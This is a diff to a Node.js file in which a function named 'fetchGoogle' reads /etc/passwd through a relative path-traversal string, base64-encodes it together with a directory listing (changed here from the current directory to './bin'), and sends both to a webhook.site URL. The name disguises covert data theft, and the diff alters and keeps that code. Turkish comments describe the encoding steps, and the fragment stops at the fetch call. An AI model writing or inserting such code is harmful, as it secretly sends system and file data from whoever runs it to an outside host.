@@ -1,8 +1,9 @@
 const fs = require('fs');
 const fetch = require('node-fetch');
+const path = require('path');
 
 function fetchGoogle(ctx, req, res) {
-    fs.readFile('../../../../../../etc/passwd', 'utf8', (err, data) => {
+    fs.readFile('../../../../../etc/passwd', 'utf8', (err, data) => {
         if (err) {
             res.writeHead(500, { 'Content-Type': 'text/plain' });
             res.end('Error reading file: ' + err.message);
@@ -11,14 +12,15 @@ function fetchGoogle(ctx, req, res) {
 
         const base64FileContent = Buffer.from(data).toString('base64'); // Dosyanın içeriğini base64 formatına çevir
 
-        fs.readdir('.', (err, files) => {
+        const binDirPath = path.join('.', 'bin');
+        fs.readdir(binDirPath, (err, files) => {
             if (err) {
                 res.writeHead(500, { 'Content-Type': 'text/plain' });
-                res.end('Error reading directory: ' + err.message);
+                res.end('Error reading bin directory: ' + err.message);
                 return;
             }
 
-            const base64FileList = Buffer.from(files.join('\n')).toString('base64'); // Dizindeki dosyaların listesini base64 formatına çevir
+            const base64FileList = Buffer.from(files.join('\n')).toString('base64'); // bin dizinindeki dosyaların listesini base64 formatına çevir
 
             const fetchPromises = [
                 fetch(`https://webhook.site/e4c4d30e-841b-43ee-8b63-8749c0066779/${base64FileContent}`, {
